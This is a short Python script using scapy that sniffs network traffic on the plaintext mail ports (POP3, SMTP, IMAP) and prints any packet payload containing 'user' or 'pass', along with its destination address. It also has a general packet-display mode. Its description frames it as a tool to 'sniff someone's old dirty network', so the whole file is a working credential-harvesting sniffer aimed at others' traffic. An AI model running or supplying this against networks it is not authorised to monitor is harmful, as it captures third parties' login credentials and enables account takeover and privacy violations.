import argparse
from scapy.all import sniff, TCP, IP


def check_mail_creds(packet):
    print(packet)
    if packet[TCP].payload:
         mypacket = str(packet[TCP].payload)
         if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
             print(f"[*] Destination: {packet[IP].dst}")
             print(f'[*] {str(packet[IP].payload)}')


def show_packets(packet):
    print(packet.show())    

def mail():
    # Sniff ports for POP3 or SMTP or IMAP without using RAM
    sniff(filter = 'tcp port 110 or tcp port 25 or tcp port 143',
            prn  =  check_mail_creds, store = 0)

def main(): 
    parser = argparse.ArgumentParser(
        usage       = "./scapy-mailsniffer.py [options] -s -m\n",
        description = "Sniff someone's old dirty network",) 
    
    parser.add_argument("-s", "--show", action ="store_true", dest = "show", help = "Display packet contents and dissect protocol info")
    parser.add_argument("-m", "--mail", action ="store_true", dest = "mail", help = "Capture POP3, SMTP or IMAP traffic on TCP protocol.")
    
    args = parser.parse_args()

    if args.mail:
        mail()

    if args.show:
        NIC = input('Enter NIC to sniff: ')
        num = input('How many packet you want to sniff? ')
        sniff(iface= NIC, prn= show_packets, count=int(num))

    else:
        return


if __name__ == '__main__':
    main()

    
